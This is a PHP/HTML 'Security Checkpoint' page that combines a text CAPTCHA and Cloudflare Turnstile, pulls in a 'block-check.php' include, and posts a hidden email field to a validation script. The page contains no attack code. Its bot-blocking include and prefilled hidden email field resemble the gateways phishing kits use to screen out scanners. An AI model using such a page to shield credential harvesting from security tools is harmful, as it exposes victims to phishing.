<?php
include 'block-check.php';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Protection Gateway</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Style here (same as shared) */
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Security Checkpoint</h1>
            <i class="fas fa-lock" style="font-size: 1.5em; color: #0078d4;"></i>
        </div>
        <p class="description">Please complete the CAPTCHA below to verify that you are not a robot and proceed.</p>
        <form id="captcha-form" action="/validate_captcha.php" method="POST">
            <input type="hidden" id="email" name="email">
            <!-- Text-based CAPTCHA -->
            <label for="text-captcha">Enter the characters in the picture:</label>
            <div class="captcha-image">
                <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image">
                <button type="button" onclick="refreshCaptcha()">
                    <i class="fas fa-sync-alt" style="font-size: 1.5em; color: #0078d4;"></i>
                </button>
            </div>
            <input type="text" id="text-captcha" name="text_captcha" required>
            <!-- Cloudflare Turnstile CAPTCHA -->
            <div class="cf-turnstile" data-sitekey="0x4AAAAAAAzbaCIIxhpKU4HJ" data-callback="onTurnstileVerified"></div>
            <div class="button-container">
                <button id="next-button" class="next-button" type="submit" disabled>Submit</button>
            </div>
        </form>
    </div>
    <script>
        function refreshCaptcha() {
            document.getElementById("captcha-image").src = "/generate_captcha.php?" + Date.now();
        }
        function onTurnstileVerified(token) {
            document.getElementById('next-button').disabled = false;
        }
    </script>
</body>
</html>
